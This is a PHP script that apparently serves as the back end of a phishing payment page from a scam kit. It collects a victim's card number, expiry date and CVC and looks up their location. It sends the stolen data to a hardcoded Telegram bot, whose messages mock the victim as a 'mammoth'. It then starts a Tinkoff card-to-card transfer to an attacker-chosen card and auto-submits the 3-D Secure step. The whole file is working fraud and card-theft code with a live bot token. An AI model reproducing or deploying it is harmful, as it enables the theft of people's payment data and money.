<?php
$card = ''; //номер карты
$cardno = str_replace(' ', '', $_POST['card_number']);
$a = str_replace('/', '', $_POST['expdate']);

date_default_timezone_set("Europe/Moscow");
$date = date("d-m-Y H:i");
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = array('country'=>'', 'city'=>'');
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));    
if($ip_data && $ip_data->geoplugin_countryName != null)
{
    $result = $ip_data->geoplugin_regionName;
}


if(mb_strlen($cardno) == 16){
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://securepay.tinkoff.ru/c2c/Init",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => "TerminalKey=1512661336231C2C&OrderId=".rand(),
    CURLOPT_HTTPHEADER => array("Content-Type: application/x-www-form-urlencoded")));
    $gettrn = json_decode(curl_exec($curl));
    $trn = $gettrn->PaymentId;
    if($gettrn->ErrorCode == 0 && $gettrn->Success == 'true'){
		$message = urlencode("[Мамонт ниже хочет денег дать]

Айпи мамонта: ".$_SERVER['REMOTE_ADDR']."\nUser-agent: ".$user_agent."\nГеолокация мамонта: ".$result."\nНомер карты: " . $cardno . ",\nСрок действия: " . $_POST["mm"] . "/" . $_POST["yy"] . ",\nCVC: " . $_POST["card_cvc"] . "\nСумма платежа: " . $_POST['amount'] . " руб.\nОписание платежа: " . $_POST["description"] . "");
file_get_contents("https://api.telegram.org/bot975647062:AAFSWM16xgVKND_3NPNtIYY_mjykaCj6ffM/sendMessage?text=$message&chat_id=659640009");
$response = array('type' => 'successChange', 'message' => 'successChange');
        file_get_contents($gettrn->PaymentURL);
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => "https://securepay.tinkoff.ru/c2c/FinishAuthorize",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "TerminalKey=1512661336231C2C&PaymentId=$trn&Amount=".$_POST['amount']."00&SourceCardData=PAN=".$cardno.";ExpDate=".$a.";CVV=".$_POST['card_cvc']."&DstCardNumber=$card&Currency=643&Fee=4000",
        CURLOPT_HTTPHEADER => array("Content-Type: application/x-www-form-urlencoded"),
        ));
        $response = curl_exec($curl);
        curl_close($curl);
        preg_match_all('/name=[""]([^"]*)" value=[""]([^"]*)"/m', $response, $rvall, PREG_SET_ORDER, 0);
        preg_match_all('/name=[""]([^"]*)" action=[""]([^"]*)"/m', $response, $matches, PREG_SET_ORDER, 0);
        echo '<html><head>' .
        '<script src="https://code.jquery.com/jquery-3.3.1.js"></script>' .
        '<script>$(document).ready(function(){$("#payform").submit();});</script>' .
        '</head><body style="padding: 0px; margin: 0px;">' .
        '<form action="' . $matches[0][2] . '" method="post" target="payframe" id="payform">' .
        '<input type="hidden" name="PaReq" value="' . $rvall[0][2] . '">' .
        '<input type="hidden" name="MD" value="' . $rvall[2][2] . '">' .
        '<input type="hidden" name="TermUrl" value="https://' . $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]) . '/status.php">' .
        '</form>' .
        '<iframe name="payframe" style="width: 100%; height: 100%; border: 0px;"></iframe>' .
        '</body></html>';
    }else{
		header("Location: error.php");
    }
}else{
  	header("Location: error.php");
}
